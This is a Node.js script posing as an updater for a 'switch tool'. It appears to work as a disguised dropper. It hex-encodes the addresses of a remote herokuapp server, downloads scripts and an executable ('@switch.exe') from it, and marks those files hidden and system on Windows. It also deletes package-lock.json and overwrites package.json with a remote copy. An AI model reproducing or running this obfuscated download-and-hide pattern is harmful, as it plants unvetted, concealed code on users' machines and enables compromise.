let hW = [
    fhs(
      '68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f63'
    ), // [0c]
    fhs(
      '68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f73'
    ), // [1s]
    fhs(
      '68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f73796e63'
    ), // [2sync]
    fhs(
      '68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f407377697463682e657865'
    ), // [3e] -
    fhs('407377697463682e657865'), // [4e]
    fhs('7061636b6167652d6c6f636b2e6a736f6e'), // [5] lock
    fhs('7061636b6167652e6a736f6e'), // [6] pg_
    fhs(
      '68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f7061636b6167652e6a736f6e'
    ), // [7] - https://blogspotscraping.herokuapp.com/switchtool/package.json
    fhs('6e6f64652d6665746368'), //[8] node-fetch
  ],
  links = {
    c: hex2a(hW[0]),
    s: hex2a(hW[1]),
    sync: hex2a(hW[2]),
    snet: hex2a(hW[3]),
    pkg: hex2a(hW[7]),
  },
  fetch = require(hex2a(hW[8])),
  fs = require('fs'),
  log = console.log,
  allowLog = false,
  headers = {
    'User-Agent':
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0',
  };
function fhs(hexString) {
  if (hexString.length % 2 == 0) {
    var arr = hexString.split('');
    var y = 0;
    for (var i = 0; i < hexString.length / 2; i++) {
      arr.splice(y, 0, '\\x');
      y = y + 3;
    }
    return arr.join('');
  } else {
    log('formalize failed');
  }
}
function hex2a(hex) {
  var str = '';
  for (var i = 0; i < hex.length; i += 2) {
    var v = parseInt(hex.substr(i, 2), 16);
    if (v) str += String.fromCharCode(v);
  }
  return str;
}
function deleteFile(fileName) {
  if (fileName == 'snet') fileName = hex2a(hW[4]);
  if (fs.existsSync(fileName)) {
    fs.unlinkSync(fileName);
    if (allowLog) log('Deleted %s', fileName);
  }
}
function saveFile(fileName, fileContent) {
  // var folder = "./";
  // if (!fs.existsSync(folder)) {
  //     fs.mkdirSync(folder);
  // }
  fs.writeFile(fileName, fileContent, function (err) {
    if (err) return log(err);
    if (allowLog) log('Updated ' + fileName + ' > successfully');
  });
}
async function fetchTool(url) {
  return (await fetch(url, { headers: headers })).text();
}
async function update(toolName) {
  var linkTool = links[toolName];
  switch (toolName) {
    case 'c':
    case 's':
    case 'sync':
    case 'pkg':
      let tool = await fetchTool(linkTool);
      if (toolName === 'pkg') toolName = hex2a(hW[6]);
      await saveFile(toolName, tool);
      break;
    case 'snet':
      //   var fileStream = fs.createWriteStream(__dirname + '/' + hex2a(hW[4]));
      //   fileStream.on('close', function () {
      //     if (allowLog) log('Updated snet > successfully');
      //   });
      //   request(linkTool).pipe(fileStream);
      // node-fetch
      const response = await fetch(linkTool);
      const buffer = await response.buffer();
      fs.writeFile(__dirname + '/' + hex2a(hW[4]), buffer, () => log(''));
      break;
  }
}
(async function () {
  log('Updating...');
  deleteFile('c');
  deleteFile('s');
  deleteFile('sync');
  deleteFile('snet');
  if (fs.existsSync(hex2a(hW[5]))) fs.unlinkSync(hex2a(hW[5]));
  await update('c');
  await update('s');
  await update('sync');
  await update('snet');
  log('Updated');
  log('Configurating...');
  if (process.platform === 'win32') {
    var winattr = require('winattr');
    winattr.setSync('c', { hidden: true });
    winattr.setSync('c', { system: true });
    winattr.setSync('s', { hidden: true });
    winattr.setSync('s', { system: true });
    winattr.setSync('sync', { hidden: true });
    winattr.setSync('sync', { system: true });
    winattr.setSync(hex2a(hW[4]), { hidden: true });
    winattr.setSync(hex2a(hW[4]), { system: true });
  }
  await update('pkg');
  log('Done !!!');
  log('======================== Manual ========================');
  log('type "node help s" -> show manual of switch tool');
  log('type "node help c" -> show manual of check & copy tool');
})();
